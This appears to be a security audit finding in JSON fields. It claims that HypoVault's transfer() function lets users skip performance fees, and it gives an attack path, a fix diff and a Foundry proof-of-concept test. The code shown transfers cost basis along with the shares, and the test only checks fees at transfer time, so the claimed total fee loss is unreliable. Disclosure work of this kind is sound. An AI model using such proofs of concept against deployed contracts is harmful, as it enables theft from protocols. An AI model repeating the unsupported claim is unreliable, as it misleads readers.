  "body": "## Summary\n\nUsers can bypass performance fees by transferring profitable shares instead of withdrawing, causing the protocol to lose 100% of its performance fee revenue on profitable positions.\n\n## Root cause\n\nThe `transfer()` function only performs regular ERC20 transfers without calculating and deducting performance fees as the withdrawal function does.\n\n```solidity \n406:    function transfer(address to, uint256 amount) public override returns (bool success) {\n407:        _transferBasis(msg.sender, to, amount);\n408:        return super.transfer(to, amount);\n408:    }\n```\n`function transfer` is incomplete - allows profit inheritance without fee assessment.\n\n## Attack path \n\n1. User deposits when vault NAV = X\n2. Vault generates profit, NAV = Y (where Y > X)\n3. User's shares now worth more than their basis\n4. User transfers shares to accomplice instead of withdrawing\n5. Performance fee completely bypassed\n6. Accomplice can withdraw profit without fee\n\n## Impact\n\nThe protocol loses its entire revenue stream from performance fees because users can bypass the fee system through simple share transfers, making the vault business model unsustainable.\n>No fees = No revenue = Broken business model \n\n## Mitigation\n\nAdd profit check in `transfer()` function before calling `_transferBasis`:\n\n```diff\nfunction transfer(address to, uint256 amount) public override returns (bool success) {\n+   // Check if transfer involves profit\n+   uint256 userBalance = balanceOf[msg.sender];\n+   if (userBalance > 0) {\n+       uint256 userBasisForTransfer = (userBasis[msg.sender] * amount) / userBalance;\n+       \n+       uint256 totalAssets = accountant.computeNAV(address(this), underlyingToken, \"\") + 1 \n+                           - depositEpochState[depositEpoch].assetsDeposited \n+                           - reservedWithdrawalAssets;\n+       uint256 currentValueForTransfer = Math.mulDiv(amount, totalAssets, totalSupply);\n+       \n+       if (currentValueForTransfer > userBasisForTransfer) {\n+           revert(\"Use withdrawal mechanism for profitable position\");\n+       }\n+   }\n    \n    _transferBasis(msg.sender, to, amount);\n    return super.transfer(to, amount);\n}\n```",
  "proof_of_concept": "This function proves that `function transfer()` in `HypoVault` that performance fees can be bypassed completely.\n\nRan with the following command: `forge test --match-test test_submissionValidity -vvvv`\n\n```solidity\nfunction test_submissionValidity() external {\n    // Setup vault\n    mockAccountant.setExpectedVault(address(vault));\n    mockAccountant.setNav(1000 ether);\n    \n    // Alice deposits 100 ether\n    vm.startPrank(Alice);\n    vault.requestDeposit(100 ether);\n    vm.stopPrank();\n    \n    vm.startPrank(Manager);\n    vault.fulfillDeposits(100 ether, \"\");\n    vault.executeDeposit(Alice, 0);\n    vm.stopPrank();\n    \n    // Vault makes 100% profit\n    mockAccountant.setNav(2000 ether); // 1000 → 2000 ether\n    \n    // Alice's shares now worth 200 ether (100 ether profit)\n    // Expected performance fee: 100 ether × 1% = 1 ether\n    \n    // Alice transfers all shares to Bob\n    uint256 aliceShares = vault.balanceOf(Alice);\n    vm.startPrank(Alice);\n    vault.transfer(Bob, aliceShares);\n    vm.stopPrank();\n    \n    // VULNERABILITY: No fee collected despite 100 ether profit transfer\n    uint256 feeWalletShares = vault.balanceOf(FeeWallet);\n    uint256 bobShares = vault.balanceOf(Bob);\n    \n    assertEq(feeWalletShares, 0, \"CRITICAL: No performance fee collected\");\n    assertEq(bobShares, aliceShares, \"Bob receives full profitable shares\");\n    \n    // Bob now owns 200 ether worth of shares but only pays fee on his \"basis\"\n    // Alice earned 100 ether profit but paid ZERO fee\n    // Protocol lost 1 ether in performance fees\n}\n```",
